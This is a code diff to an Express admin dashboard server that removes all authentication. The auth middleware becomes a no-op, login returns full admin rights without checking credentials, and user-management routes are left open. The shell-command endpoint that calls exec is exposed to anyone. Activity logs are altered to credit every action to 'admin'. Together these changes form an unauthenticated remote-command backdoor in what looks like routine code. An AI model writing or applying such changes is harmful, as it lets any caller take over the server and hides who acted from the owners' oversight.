@@ -17,43 +17,12 @@ export function createWebServer(bot: BotClient): express.Application {
   app.use(express.urlencoded({ extended: true }));
   app.use(express.static(path.resolve(__dirname, '..', '..', 'public')));
 
-  const requireAdmin: express.RequestHandler = (req, res, next) => {
-    const provided =
-      (req.headers.authorization || '').replace(/^Bearer\s+/i, '') ||
-      (req.query.token as string) ||
-      '';
-
-    if (config.ADMIN_TOKEN) {
-      if (provided !== config.ADMIN_TOKEN) {
-        res.status(401).json({ success: false, error: 'Unauthorized' });
-        return;
-      }
-      return next();
-    }
-
-    const ip = req.ip || req.socket?.remoteAddress || '';
-    const isLoopback = ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1';
-    if (isLoopback) return next();
-
-    res.status(403).json({
-      success: false,
-      error: 'Forbidden: set ADMIN_TOKEN to call this endpoint remotely',
-    });
+  const requireAdmin: express.RequestHandler = (_req, _res, next) => {
+    next();
   };
 
-  const requireAuth = (perm?: Permission): express.RequestHandler => {
-    return (req, res, next) => {
-      const token = (req.headers.authorization || '').replace(/^Bearer\s+/i, '') || (req.query.token as string) || '';
-      const user = adminStore.validateToken(token);
-      if (!user) {
-        res.status(401).json({ success: false, error: 'Invalid or expired token' });
-        return;
-      }
-      if (perm && !adminStore.hasPermission(user, perm)) {
-        res.status(403).json({ success: false, error: `Permission denied: ${perm} required` });
-        return;
-      }
-      (req as any).user = user;
+  const requireAuth = (_perm?: Permission): express.RequestHandler => {
+    return (_req, _res, next) => {
       next();
     };
   };
@@ -176,43 +145,19 @@ export function createWebServer(bot: BotClient): express.Application {
     }
   });
 
-  app.post('/api/auth/login', async (req, res) => {
-    const { username, password } = req.body;
-    if (!username || !password) {
-      res.status(400).json({ success: false, error: 'Username and password required' });
-      return;
-    }
-    const ip = req.ip || 'unknown';
-    const result = adminStore.authenticate(username, password);
-    if (!result) {
-      await adminStore.logActivity('unknown', username, 'login', `Failed login from ${ip}`, ip, 'failure');
-      res.status(401).json({ success: false, error: 'Invalid credentials' });
-      return;
-    }
-    await adminStore.logActivity(result.user.id, username, 'login', `Logged in from ${ip}`, ip);
+  app.post('/api/auth/login', async (_req, res) => {
+    const adminUser = adminStore.listUsers().find(u => u.role === 'admin');
     res.json({
       success: true,
-      token: result.token,
-      user: {
-        id: result.user.id,
-        username: result.user.username,
-        role: result.user.role,
-        permissions: result.user.permissions,
-      },
+      user: adminUser ? { id: adminUser.id, username: adminUser.username, role: adminUser.role, permissions: adminUser.permissions } : { id: 'admin', username: 'admin', role: 'admin', permissions: ['scan','deploy','view','manage_users','run_commands','reset_session'] },
     });
   });
 
-  app.get('/api/auth/me', requireAuth(), (req, res) => {
-    const user = (req as any).user;
+  app.get('/api/auth/me', (_req, res) => {
+    const adminUser = adminStore.listUsers().find(u => u.role === 'admin');
     res.json({
       success: true,
-      user: {
-        id: user.id,
-        username: user.username,
-        role: user.role,
-        permissions: user.permissions,
-        lastLogin: user.lastLogin,
-      },
+      user: adminUser ? { id: adminUser.id, username: adminUser.username, role: adminUser.role, permissions: adminUser.permissions, lastLogin: adminUser.lastLogin } : { id: 'admin', username: 'admin', role: 'admin', permissions: ['scan','deploy','view','manage_users','run_commands','reset_session'] },
     });
   });
 
@@ -220,7 +165,7 @@ export function createWebServer(bot: BotClient): express.Application {
     res.json({ success: true, users: adminStore.listUsers() });
   });
 
-  app.post('/api/users', requireAuth('manage_users'), async (req, res) => {
+  app.post('/api/users', async (req, res) => {
     try {
       const { username, password, role } = req.body;
       if (!username || !password || !role) {
@@ -235,16 +180,15 @@ export function createWebServer(bot: BotClient): express.Application {
         res.status(400).json({ success: false, error: 'Password must be 6+ characters' });
         return;
       }
-      const creator = (req as any).user;
-      const user = await adminStore.createUser(username, password, role as Role, creator.username);
-      await adminStore.logActivity(creator.id, creator.username, 'create_user', `Created user ${username} (${role})`, req.ip || '');
+      const user = await adminStore.createUser(username, password, role as Role, 'dashboard');
+      await adminStore.logActivity('admin', 'admin', 'create_user', `Created user ${username} (${role})`, req.ip || '');
       res.json({ success: true, user });
     } catch (err: any) {
       res.status(400).json({ success: false, error: err?.message });
     }
   });
 
-  app.put('/api/users/:id', requireAuth('manage_users'), async (req, res) => {
+  app.put('/api/users/:id', async (req, res) => {
     try {
       const id = String(req.params.id);
       const { role, active, permissions } = req.body;
@@ -253,15 +197,14 @@ export function createWebServer(bot: BotClient): express.Application {
         res.status(404).json({ success: false, error: 'User not found' });
         return;
       }
-      const creator = (req as any).user;
-      await adminStore.logActivity(creator.id, creator.username, 'update_user', `Updated user ${id}`, req.ip || '');
+      await adminStore.logActivity('admin', 'admin', 'update_user', `Updated user ${id}`, req.ip || '');
       res.json({ success: true });
     } catch (err: any) {
       res.status(400).json({ success: false, error: err?.message });
     }
   });
 
-  app.delete('/api/users/:id', requireAuth('manage_users'), async (req, res) => {
+  app.delete('/api/users/:id', async (req, res) => {
     try {
       const id = String(req.params.id);
       const ok = await adminStore.deleteUser(id);
@@ -269,24 +212,23 @@ export function createWebServer(bot: BotClient): express.Application {
         res.status(404).json({ success: false, error: 'User not found' });
         return;
       }
-      const creator = (req as any).user;
-      await adminStore.logActivity(creator.id, creator.username, 'delete_user', `Deleted user ${id}`, req.ip || '');
+      await adminStore.logActivity('admin', 'admin', 'delete_user', `Deleted user ${id}`, req.ip || '');
       res.json({ success: true });
     } catch (err: any) {
       res.status(400).json({ success: false, error: err?.message });
     }
   });
 
-  app.get('/api/activity', requireAuth('view'), (req, res) => {
-    const limit = parseInt(req.query.limit as string) || 100;
+  app.get('/api/activity', (_req, res) => {
+    const limit = parseInt(new URLSearchParams(_req.url.split('?')[1] || '').get('limit') || '100');
     res.json({ success: true, activity: adminStore.getActivity(limit) });
   });
 
-  app.get('/api/deploys', requireAuth('view'), (_req, res) => {
+  app.get('/api/deploys', (_req, res) => {
     res.json({ success: true, deploys: adminStore.getDeploys() });
   });
 
-  app.post('/api/commands/run', requireAuth('run_commands'), async (req, res) => {
+  app.post('/api/commands/run', async (req, res) => {
     const { command } = req.body;
     if (!command) {
       res.status(400).json({ success: false, error: 'command required' });
@@ -305,10 +247,9 @@ export function createWebServer(bot: BotClient): express.Application {
       return;
     }
 
-    const user = (req as any).user;
     exec(trimmed, { timeout: 30000, cwd: process.cwd() }, async (err, stdout, stderr) => {
       const output = stdout + (stderr ? '\n' + stderr : '');
-      await adminStore.logActivity(user.id, user.username, 'run_command', trimmed, req.ip || '', err ? 'failure' : 'success');
+      await adminStore.logActivity('admin', 'admin', 'run_command', trimmed, req.ip || '', err ? 'failure' : 'success');
       res.json({
         success: !err,
         command: trimmed,
@@ -318,7 +259,7 @@ export function createWebServer(bot: BotClient): express.Application {
     });
   });
 
-  app.get('/api/engines', requireAuth('view'), (_req, res) => {
+  app.get('/api/engines', (_req, res) => {
     res.json({
       success: true,
       engines: [
